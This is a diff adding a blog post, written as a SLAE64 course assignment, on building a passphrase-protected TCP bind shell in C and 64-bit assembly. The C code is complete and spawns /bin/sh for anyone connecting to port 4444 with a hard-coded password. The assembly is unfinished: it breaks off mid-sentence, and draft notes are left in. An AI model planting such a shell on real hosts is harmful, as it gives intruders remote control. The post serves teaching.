@@ -1,0 +1,377 @@
++++
+title = "Security Tube SLAE64 Course - Assessment 1 - TCP Bind Shell"
+author = "Codehead"
+layout = "post"
+date = "2017-10-17T14:02:00"
+url = "/slae64-01-bind-shell/"
+categories = [ "SLAE64", "Assembler", "Shellcode" ]
+tags = [ "assembler", "shellcode" ]
++++
+
+After completing the video lectures of the Security Tube Linux 64 bit Assembler Expert course (SLAE64), a series of assessments must be completed to gain certification. The first assignment is to create a shellcode string that will start a TCP Bind Shell. 
+
+A bind shell listens on a network port and waits for an incoming connection. A new socket is created on connection, the I/O streams of the host are cloned into this new socket and a new shell instance is spawned. 
+
+This has the effect of giving the remote user an interactive shell on the host system. Of course this is not as secure as something like an SSH connection, but is quite sufficient to let a remote user poke around the host system, issue commands and exfiltrate data.
+
+As an extra twist, the assignment requires a little more security; a passphrase must be implemented in the bind shell code to prevent anyone who happens to stumble across the listening socket from simply dropping into the host shell.
+
+Of course, this 'security' is limited and anyone eavesdropping on the connection could sniff the passphrase with minimal effort, but it is an interesting exercise.
+
+<!--more-->
+
+## High Level Proof of Concept
+
+Vivek provided a rough outline of the code in C during the course and this was taken as a base for this assignment.
+
+The full listing of my version of the code is hosted on GitHub: [Bind_Shell.c](https://github.com/CodeheadUK/SLAE64/blob/master/src/bind_shell.c).
+
+The basic sections of code are:
+
+### Variable Definitions and Initialisation
+
+{{< highlight c >}}
+// Socket descriptors
+int svr_sock;
+int client_sock;
+
+// Socket definitions
+struct sockaddr_in server;
+struct sockaddr_in client;
+int sockaddr_len = sizeof(struct sockaddr_in);
+
+// Some strings
+char *arguments[] = { "/bin/sh", 0 };
+char *in[] = { "xxxxxxxxxx", 0 };
+bzero(&in, 10);
+
+// Loop flag
+int connected = 0;
+{{</ highlight >}}
+
+The first two variables are descriptors which will hold the identifiers for the sockets we'll create later.
+
+The <tt>sockaddr_in</tt> structures are used to define the socket configurations. We'll populate the <tt>server</tt> configuration manually in the next step, but the <tt>client</tt> structure will be generated for us when we accept an incoming connection.
+
+Lastly, we define a couple of string buffers that we'll need later and a flag to control the authentication loop. The buffer definitions are a bit odd, but we don't want to worry about memory allocation here and will handle these strings differently in the assembly language anyway.
+
+### Server Socket Initialisation
+
+The server <tt>sockaddr_in</tt> structure is configured as an IPv4 port, listening on port 4444 of all IP interfaces (0.0.0.0).
+
+Using this configuration, we create a TCP socket, bind it and start listening on the port.
+
+{{< highlight c >}}
+// Populate the server port information
+server.sin_family = AF_INET;         // AF_INET = 2
+server.sin_port = htons(4444);
+server.sin_addr.s_addr = INADDR_ANY; // INADDR_ANY = 0
+bzero(&server.sin_zero, 8);
+
+// Create the server socket
+if((svr_sock = socket(AF_INET, SOCK_STREAM,  0 )) == -1) // SOCK_STREAM = 1
+{
+    perror("Server socket: ");
+    exit(-1);
+}
+
+// Bind the port
+if((bind(svr_sock, (struct sockaddr *)&server, sockaddr_len)) == -1)
+{
+    perror("Bind: ");
+    exit(-1);
+}
+
+// Start listening for incoming connections
+if((listen(svr_sock, 2)) == -1)
+{
+    perror("Listen: ");
+    exit(-1);
+}
+{{</ highlight >}}
+
+I have included the numeric values of the various constants as comments to make the conversion to assembler easier later. These can either be gleaned from the source code, the documentation or dumped from Python:
+
+{{< highlight text >}}
+MBP:slae64$ python
+Python 2.7.12 (default, Jun 29 2016, 14:05:02)
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import socket
+>>> print socket.AF_INET
+2 
+{{</ highlight >}}
+
+### Accept and validate incoming connections
+
+Now we have a listening socket, we can accept incoming connections. Passphrase validation is a loop that accepts incoming connections, prompts for input and checks any received data against the pre-set password.
+
+{{< highlight c >}}
+// Start of authentication loop
+do
+{
+    // Accept a request and spawn a new socket for the connection
+    if((client_sock = accept(svr_sock, (struct sockaddr *)&client, &sockaddr_len)) == -1)
+    {
+        perror("Accept: ");
+        exit(-1);   
+    }
+{{</ highlight >}}
+
+This code accepts the connection and retains the newly spawned socket that the remote user is connected to.
+
+We now send a message down the new socket to request the secret passphrase from the connecting user. Any received data is placed in the <tt>in</tt> array.
+
+{{< highlight c >}}
+    // Request a passphrase
+    send(client_sock, (char*)"Speak Friend and Enter: ", 24, 0);
+    read(client_sock, &in, 10);
+{{</ highlight >}}
+
+A bad passphrase results in the new socket being closed and the system going back to listening. Input data is limited by the length value in the read call. However, we have to zero out the input buffer after a failed attempt as there many be leftover data which could interfere with the next pass.
+
+{{< highlight c >}}
+    // Validate the passphrase
+    if(strcmp(&in, "password\n") != 0)
+    {
+        // Reject bad passphrase and reset for next connection
+        send(client_sock, (char*)"Goodbye\n", 8, 0);
+        close(client_sock);
+        printf("Auth fail: %s\n", (char*)in);
+        bzero(&in, 10);
+    }
+{{</ highlight >}}
+
+If we get a good passphrase, we can break out of the authentication loop.
+
+{{< highlight c >}}
+    else
+    {   
+        // Break out of the loop when passphrase is good 
+        send(client_sock, (char*)"Welcome\n", 8, 0);
+        connected = 1;
+        printf("Auth Passed!\n");
+    }
+}while(connected == 0);
+{{</ highlight >}}
+
+### Spawning the new shell
+
+We have authenticated our incoming connection, so we can kill off the server socket as it is no longer required. Then all that remains is to clone the I/O streams into the new socket and spawn the shell.
+
+{{< highlight c >}}
+// Kill the server socket
+close(svr_sock);
+
+// Redirect file descriptors to new socket
+dup2(client_sock, 0); // STDIN
+dup2(client_sock, 1); // STDOUT
+dup2(client_sock, 2); // STDERR
+
+// Start a shell
+execve(arguments[0], &arguments[0], NULL);
+{{</ highlight >}}
+
+Note that the <tt>execve</tt> function call requires a reference to the <tt>'/bin/sh'</tt> string and an array containing the <tt>'/bin/sh'</tt> string as arguments. Keeping this structure small requires some interesting memory gymnastics which explain the odd definitions in the C code.
+
+With that, we have completed the required functionality of the bind shell in C. Now we have the fun task of converting these operations to Assembler.
+
+## Translating the code to Assembler
+
+### Establishing variable storage requirements
+
+There are quite a few variables and structures to deal with in this code. Some values are pointers that require addressable locations and the number of basic variables that we need to persist makes juggling registers to avoid syscall clobbering a burden.
+
+Reviewing the C code, it seems that we need to persist at least 3 integer variables (<tt>svr_sock</tt>, <tt>client_sock</tt> and <tt>sockaddr_len</tt>). We also need buffers for the <tt>sockaddr_in</tt> structures, the user input and the <tt>execve</tt> arguments.
+
+The <tt>sockaddr_in</tt> structure is described in <tt>netinet/in.h</tt>
+
+{{< highlight c >}}
+struct sockaddr_in {
+    short            sin_family;   // 2 Bytes. e.g. AF_INET (2)
+    unsigned short   sin_port;     // 2 Bytes. Network order.
+    struct in_addr   sin_addr;     // see struct in_addr, below
+    char             sin_zero[8];  // Zero padding. 8 bytes.
+};
+
+struct in_addr {
+    unsigned long s_addr;  // 4 bytes.
+};
+{{</ highlight >}}
+
+This totals 16 bytes. However, we don't really need two instances of this, we can re-use the same location for both sockets.
+
+The <tt>execve</tt> call requires a <tt>'/bin/sh'</tt> string and an argument array containing at least two address references. As we're using 64-bit assembly, the default size of addresses is 64 bits, or 8 bytes. So we can fit all our strings, structures and arrays nicely in two 16 byte buffers.
+
+The stack provides a nice solution to the storage problem. I came up with the following layout to meet the requirements of this code: 
+
+![image](img/StackBuffer.png)
+
+Although the stack is often said to grow 'downwards' in memory, it is often easier to visualise it growing upwards. This makes the layout of structures and buffers more logical and simplifies the view of offsets.
+
+We'll use buffer 1 for the server and client structures as well as the input string from the user. The socket variables are fixed and buffer 2 will be used for the <tt>execve</tt> array. 
+
+I found that having a decent sketch of the stack layout and offsets makes writing and reading back the assembly language much easier.
+
+### Setting up 
+
+The first thing to do is set RBP to the base of the stack so that the offsets in the layout sketch are correct.
+
+Next we'll use the Jump, Call, Pop method to establish the location of the embedded strings. Through trial and error I found that register <tt>r15</tt> was not clobbered by any of the syscalls, so that serves as a placeholder for the string reference address. 
+
+{{< highlight asm >}}
+global _start
+section .text
+
+_start:
+    mov rbp, rsp        ; Get a reference to the base of the stack
+    jmp short _strdata  ; Find address of string list
+
+_getref:                ; Keep reference to strings
+    pop r15
+    jmp _main
+
+_strdata:
+    call _getref        ; call pushes RIP onto stack
+    prompt: db "Speak friend and enter: "
+    pass:   db "password", 0xa
+    good:   db "Welcome", 0xa
+    bad:    db "Wrong", 0xa
+{{</ highlight >}}
+
+### Utility functions
+
+Next in the code are a couple of utility functions. These two methods are used multiple times throughout the listing and it makes sense to break them out as a functions rather than have the code repeated multiple times. The first, <tt>_exit</tt>, is for restoring the stack pointer and stopping the code cleanly. The second, <tt>_prompt</tt>, is for sending strings to the remote client through their socket. I won't go into detail, but these methods are located at the start of the listing so that subsequent <tt>call</tt> instructions will have a negative offset with no troublesome zeros.
+
+{{< highlight asm >}}
+_exit:                  ; exit nicely
+    xor rax, rax
+    push rax
+    pop rbx
+    add rax, 0x3c
+    add rbx, 1
+    mov rsp, rbp
+    syscall 
+
+_prompt:                ; send string to a socket, RDI (String) and RCX (Length) populated before call  
+    mov rdi, [rbp-40]
+    xor rax, rax
+    push rax
+    pop rcx
+    push rcx
+    pop r8
+    mov r9, r8
+    add rax, 44
+    syscall
+    ret
+{{</ highlight >}}
+
+### Creating the server socket
+
+The first item on our stack is the 16 byte buffer containing the <tt>sockaddr_in</tt> structure. We know the values from the C example and we have to build the structure bottom up and right to left as shown:
+
+![image](img/sockaddr_in.png)
+
+There are quite a few zeros in there. However, we can clear RAX with the XOR trick. Pushing RAX gives us the <tt>sin_zero</tt> entry. Then we can populate the remaining values with add and shift operations.
+
+{{< highlight asm >}}
+_main:
+
+; Build a server sockaddr_in struct on the stack
+    xor rax, rax
+    push rax
+    add ax, 0x5c11
+    shl rax, 16
+    add ax, 2
+    push rax
+{{</ highlight >}}
+
+To create the socket, we use the <tt>socket</tt> syscall which matches the <tt>socket()</tt> function used in the C code and the arguments are the same.
+
+ ID | Name                | Arg1                | Arg2              | Arg3
+:---|:--------------------|:--------------------|:------------------|:---------------------
+ 41 | <tt>sys_socket</tt> | <tt>int family</tt> | <tt>int type</tt> | <tt>int protocol</tt> 
+
+
+Having done some 32-bit assembler, I was used to calling functions with the arguments on the stack. However, in AMD64 code, the arguments are passed in registers.
+
+The order is as follows:
+
+Argument | Arg1 | Arg2 | Arg3 | Arg4 | Arg5
+---------|:----:|:----:|:----:|:----:|:----:
+Register | RDI  | RSI  | RDX  | R8   | R9
+
+
+Return values are still found in RAX.
+
+Unsurprisingly, Microsoft uses a different method. The various register schemes are listed on the [x86-64 Wiki Page](https://en.wikipedia.org/wiki/X86_calling_conventions#x86-64_calling_conventions).
+
+Another difference from x86 assembler is that we no longer trigger interrupt 0x80 for syscalls. The selection method remains the same, with the syscall number being placed in <tt>RAX</tt>, but there is now a dedicated SYSCALL instruction. 
+
+So, to invoke the <tt>socket</tt> syscall (ID: 41), we place 2 in <tt>RDI</tt>, 1 in <tt>RSI</tt>, 0 in <tt>RDX</tt>, 41 in <tt>RAX</tt> and then invoke the <tt>syscall</tt> instruction. 
+
+Of course, it isn't that simple if we want to keep zeros out of the shellcode, but as long as we avoid direct <tt>mov</tt> instructions and stick to increments and adds, we can easily generate the required values.
+
+{{< highlight asm >}}
+; Create socket
+    xor rax, rax
+    mov rdx, rax
+    inc rax
+    mov rsi, rax        ; SOCK_STREAM (1)
+    inc rax
+    mov rdi, rax        ; AF_INET (2)
+    add rax, 39         ; syscall 41
+    syscall
+    cmp rax, -1         ; exit on error
+    jle _exit
+    push rax            ; store socket id on stack
+{{</ highlight >}}
+
+If the return value is -1 or less, something bad has happened and we call the <tt>_exit</tt> stub. Otherwise, <tt>RAX</tt> contains the newly created socket id which we push onto the stack to create the first of our variable entries.
+
+Next we bind our server socket. Again the <tt>bind</tt> syscall matches the <tt>bind()</tt> function. 
+
+ ID | Name              | Arg1            | Arg2                             | Arg3
+:---|:------------------|:----------------|:---------------------------------|:--------------------
+ 49 | <tt>sys_bind</tt> | <tt>int fd</tt> | <tt>struct sockaddr *myaddr</tt> | <tt>int addrlen</tt> 
+
+Here we start to reference the stack variables using an offset from <tt>RBP</tt>. We need a static value of 16 for the third 
+
+{{< highlight asm >}}
+; Bind Socket
+    xor rax, rax
+    add rax, 49
+    mov rdi, [rbp-24]   ; socket id
+    lea rsi, [rbp-16]   ; sockaddr_in struct
+    xor rdx, rdx
+    add rdx, 16         ; sockaddr_in size
+    push rdx            ; create size val ref on stack
+    syscall
+    cmp rax, -1
+    jle _exit
+{{</ highlight >}}
+
+{{< highlight text >}}
+sys_sendto (id 44)
+{{</ highlight >}}
+
+{{< highlight c >}}
+socket.c
+
+SYSCALL_DEFINE6(sendto, int, fd, void __user *, buff, size_t, len,
+        unsigned, flags, struct sockaddr __user *, addr,
+        int, addr_len)
+
+
+SYSCALL_DEFINE4(send, int, fd, void __user *, buff, size_t, len,
+        unsigned, flags)
+{
+    return sys_sendto(fd, buff, len, flags, NULL, 0);
+}
+{{</ highlight >}}
+
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
+
+http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html
+
+Student ID: SLAE64-1471
+
